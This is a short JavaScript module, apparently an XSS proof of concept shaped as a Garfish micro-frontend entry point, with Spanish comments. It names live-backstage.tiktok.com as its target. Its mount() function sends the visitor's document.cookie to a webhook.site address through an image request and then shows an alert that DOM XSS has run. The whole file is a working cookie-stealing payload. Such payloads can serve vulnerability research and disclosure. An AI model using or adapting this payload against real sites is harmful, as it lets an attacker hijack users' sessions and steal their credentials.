console.log("✅ Ejecutando xss_bridge.js desde GitHub Pages");

// Este es el punto de entrada que Garfish usa
export function bootstrap() {}

export function mount() {
  // Exfiltración + PoC visual
  new Image().src = "https://webhook.site/e286a29a-cca2-4759-9da3-92f07bcf6e19?" + document.cookie;
  alert("DOM XSS ejecutado en live-backstage.tiktok.com");
}

export function unmount() {}



